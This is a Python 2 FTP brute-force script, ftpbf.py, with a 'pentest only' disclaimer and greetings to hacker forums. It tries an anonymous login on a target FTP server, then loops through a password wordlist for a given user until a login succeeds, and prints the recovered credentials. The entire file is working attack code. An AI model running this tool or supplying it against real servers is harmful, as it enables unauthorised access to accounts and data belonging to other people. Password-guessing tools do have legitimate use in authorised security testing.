#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : ftpbf.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 0.1
# About           :
# Greetz for rsauron and low1z, great python coders
# greetz for d3hydr8, qk, marezzi, StRoNiX, t0r3x, fx0, TraXdata, v0da and all members of ex darkc0de.com, ljuska.org and rev3rse.org
# 
# 
# Example of use  : ./ftpbf.py -t ftp.server.com -u baltazar -w words.txt
# After scanning check ftpbf.txt for more info (in next version)

import sys, os, time
from ftplib import FTP

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)

R = "\033[31m";
G = "\033[32m";



def logo():
	print G+"\n|---------------------------------------------------------------|"
	print "|                                                               |"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   02/2011     ftpbf.py  v.0.1                                 |"
	print "| FTP Brute Forcing Tool                                        |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
	print "\n[-] %s\n" % time.strftime("%X")
	
def help():
	logo()
        print R+"-t, --target            ip/hostname     <> Our target"
	print "-u, --user              user            <> Our user"
	print "-w, --wordlist          wordlist        <> wordlist path"
	print "-h, --help              help            <> print this help"
	print "ex: ./ftpbf -t ftp.server.com -u baltazar -w passwords.txt"
	sys.exit(1)

for arg in sys.argv:
	if arg.lower() == '-t' or arg.lower() == '--target':
            hostname = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-u' or arg.lower() == '--user':
            user = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-w' or arg.lower() == '--wordlist':
            wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-h' or arg.lower() == '--help':
        	help()
	elif len(sys.argv) <= 1:
		help()

logo()



def bf(p):
	sys.stdout.write("\r[!]Checking : %s " % (p))
	sys.stdout.flush()
	try:
		ftp = FTP(hostname)
		ftp.login(user, p)
		ftp.retrlines('list')
		ftp.quit()
		print R+"\n[!] w00t,w00t!!! We did it ! "
		print "[+] Target : ",hostname, ""
		print "[+] User : ",user, ""
		print "[+] Password : ",p, ""
		sys.exit(1)
	except Exception, e:
		pass
	except KeyboardInterrupt:
		print "\n[-] Exiting ...\n"
		sys.exit(1)
def anon():
	try:
		print "\n[!] Checking for anonymous login\n"
		ftp = FTP(hostname)
		ftp.login()
		ftp.retrlines('LIST')
		print R+"\n[!] w00t,w00t!!! Anonymous login successfuly !\n"
		
		ftp.quit()
	except Exception, e:
		print G+"\n[-] Anonymous login unsuccessful...\n"
		pass

print "[!] BruteForcing target ..."
anon()

try:
	passwords = open(wordlist, "r")
	pwd = passwords.readlines()
	count = 0
	while count < len(pwd):
		pwd[count] = pwd[count].strip()
		count +=1
except(IOError):
		print "\n[-] Check your wordlist path\n"
		sys.exit(1)
		
print G+"\n[+] Loaded:",len(pwd),"passwords"
print "[+] Target:",hostname
print "[+] User:",user
print "[+] Guessing...\n"
for p in pwd:
	bf(p.replace("\n",""))
